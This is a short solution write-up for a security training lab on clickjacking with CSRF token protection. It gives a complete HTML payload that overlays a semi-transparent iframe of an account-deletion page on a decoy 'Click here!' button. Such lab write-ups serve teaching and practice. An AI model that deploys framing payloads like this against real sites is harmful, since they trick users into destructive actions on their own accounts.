# Lab: Basic clickjacking with CSRF token protection
## Description
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.


## Solution

```html
<head>
  <style>
    #target_website {
      position:relative;
      width:528px;
      height:600px;
      opacity:0.60001;
	  margin-bottom: 200px;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
	  top:400px;
	  left:45px;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>

<body>
	<div id="decoy_website">
		<br /><br /><br />
		<button style="width: 140px; height:25px;">Click here!</button>
	</div>
	<iframe id="target_website" src="https://acaf1ff81e3577dcc08e64ae002f00d3.web-security-academy.net/my-account/delete"></iframe>
</body>
```